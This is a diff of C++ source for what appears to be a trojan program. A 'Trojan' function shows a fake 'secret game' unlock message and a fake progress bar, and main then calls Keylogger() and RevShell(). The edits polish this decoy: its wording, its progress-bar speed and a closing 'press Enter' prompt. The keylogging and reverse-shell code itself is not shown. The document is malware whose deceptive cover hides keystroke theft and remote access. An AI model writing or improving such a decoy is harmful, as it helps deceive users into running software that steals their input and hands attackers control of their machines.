@@ -43,20 +43,21 @@ void Trojan(){
     printf(" \\___  /   |__|   \\____/____  > |__|  \\___  >____ |  \\___  /   |____(____  /__|_ \\\\___  >____  >  \n");
     printf("     \\/                     \\/            \\/     \\/      \\/              \\/     \\/    \\/     \\/  \n");
 
-    printf("Now unlocking the secret game 'It's great' \n Please be patient \n");
+    printf("\n");
+    printf("Now unlocking the secret game 'It's great' \nPlease be patient... \n");
     
     //Fake a Progress bar
     #define PROGRESS_BAR_SIZE 40
 
-    //since we can't have a function inside a function in c++, we use lambdas
-    auto print_n_chars= [](int n, int c) {
+    //since we can't have a function inside a function in c++, we use lambdas & pass everything in the capture list with &
+    auto print_n_chars= [&](int n, int c) {
         while (n-- > 0) putchar(c);
     };
 
-    auto display_progress_bar = [](int p) {
+    auto display_progress_bar = [&](int p) {
         putchar('\r');
         putchar('[');
-        print_n_chars(PROGRESS_BAR_SIZE * p / 100, '|');
+        print_n_chars(PROGRESS_BAR_SIZE * p / 100, '#');
         print_n_chars(PROGRESS_BAR_SIZE - PROGRESS_BAR_SIZE * p / 100, ' ');
         putchar(']');
     };
@@ -64,8 +65,12 @@ void Trojan(){
     int p;
     for (p = 0; p <= 100; ++p) {
         display_progress_bar(p);
-        Sleep(100);
+        Sleep(50);
     }
+    //Indicate it's done and press any key to close
+    printf("\n");
+    printf("\nDone! \nPress the Enter key to close! ... ");
+    
 
 }
 /*################ KEYLOGGER #####################*/
@@ -84,4 +89,6 @@ int main (int argc, char *argv[]){
      Trojan();
      Keylogger();
      RevShell();
+     //Used to keep the window open until we press the enter key
+     cin.get();
 }
